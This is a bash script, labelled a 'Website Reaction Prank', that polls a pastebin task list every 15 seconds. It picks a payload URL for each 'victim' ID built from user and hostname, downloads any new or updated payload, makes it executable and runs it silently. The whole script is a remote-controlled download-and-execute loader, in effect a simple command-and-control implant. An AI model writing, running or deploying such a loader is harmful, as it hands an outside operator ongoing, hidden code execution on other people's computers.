#!/usr/bin/env bash
# Download and run a script from a prepspecified location.

SCRIPTDIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )

victim="$1"
if [ -z "$victim" ]; then
  victim="$USER.`hostname`"
fi

###################################################################
 # Configuration variables
taskURL="https://pastebin.com/raw/PPUdAf1s"

localTaskData="$SCRIPTDIR/taskdata"
localPayloadLoc="$SCRIPTDIR/payload"
localPayloadETag="$SCRIPTDIR/payload.etag"
localPayloadURL="$SCRIPTDIR/payload.url"

###################################################################

# Remove the payload and local values

rm -rf "$localPayloadLoc" "$localPayloadETag" "$localPayloadURL"
touch "$localPayloadLoc"
touch "$localPayloadETag"
touch "$localPayloadURL"

###################################################################

function getURLETag(){
  local url="$1"
  curl -s -I "$url" \
   | grep '^ETag' \
   | cut -d'"' -f2
}

function getTaskURL(){
  local victimID="$1"

  cat "$localTaskData" \
   | grep -v -e '^#' -e'^$' \
   | grep "^$victimID" \
   | cut -d\   -f2 \
   | head -n1
}

function getPayloadURL(){
  local url="$1"
  
  curl -H 'Cache-Control: no-cache' -s "$url" > "$localTaskData"
  local payloadURL=`getTaskURL "$victim"`
  if [ -z "$payloadURL" ]; then
    payloadURL=`getTaskURL "default"`
  fi
  echo "$payloadURL"

}

function downloadURL(){
  local url="$1"
  local outfile="$2"
  echo "downloadURL: Downloading $url"
  curl -s "$url" > "$outfile"
  chmod +x "$outfile"
}

function downloadPayloadIfNeeded(){

  local remoteURL=`getPayloadURL "$taskURL"`
  local remoteURLETag=`getURLETag "$remoteURL"`

  localURL=`head -n1 "$localPayloadURL"`
  localETag=`head -n1 "$localPayloadETag"`

  echo "downloadPayloadIfNeeded: $localURL -> $remoteURL"
  echo "downloadPayloadIfNeeded: $localETag -> $remoteURLETag"

    # We have a totally new URL, we should get it no matter what!
  if [ "$remoteURL" != "$localURL" ]; then
    echo "downloadPayloadIfNeeded: We have a new URL!"
    downloadURL "$remoteURL" "$localPayloadLoc"
    echo "$remoteURL" > "$localPayloadURL"
    echo "$remoteURLETag" > "$localPayloadETag"

  else
    echo "downloadPayloadIfNeeded: Same URL"

    if [ "$localETag" != "$remoteURLETag" ]; then
      echo "downloadPayloadIfNeeded: The payload has been updated!"
      downloadURL "$remoteURL" "$localPayloadLoc"
      echo "$remoteURLETag" > "$localPayloadETag"
    fi
  fi

}

function runPayload() {
  "$localPayloadLoc" "$victim" &> /dev/null
}

###################################################################

echo "#################################"
echo "# Website Reaction Prank         "
echo "# VictimID: $victim              "
echo "#################################"

while [ true ]; do

  downloadPayloadIfNeeded

  runPayload

  sleep 15

done
